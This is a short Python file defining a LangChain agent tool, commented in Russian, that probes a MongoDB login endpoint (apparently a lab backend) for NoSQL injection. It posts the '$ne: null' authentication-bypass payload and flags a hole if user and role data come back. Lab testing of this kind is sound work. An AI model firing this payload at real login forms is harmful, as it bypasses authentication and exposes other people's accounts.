from langchain.tools import tool
import requests


@tool
def test_nosqli_lab(url: str, endpoint: str = "/api/login"):
    """
    проверяет форму логина на NoSQL-инъекцию в MongoDB

    url - адрес ресурса (например, http://nosqli-lab-backend:5000)
    endpoint - точка входа (по умолчанию /api/login)

    отправляет POST с payload {"username": {"$ne": null}, "password": {"$ne": null}}
    возвращает статус и признак уязвимости
    """
    full_url = f"{url}{endpoint}"
    payload = {"username": {"$ne": None}, "password": {"$ne": None}}

    try:
        res = requests.post(full_url, json=payload, timeout=10)
        vulnerable = (
            res.status_code == 200
            and '"username"' in res.text
            and '"role"' in res.text
        )
        verdict = "найдена уязвимость NoSQLi" if vulnerable else "ОК"
        return f"status={res.status_code} body={res.text[:300]} verdict={verdict}"
    except Exception as e:
        return f"ошибка запроса {e}"
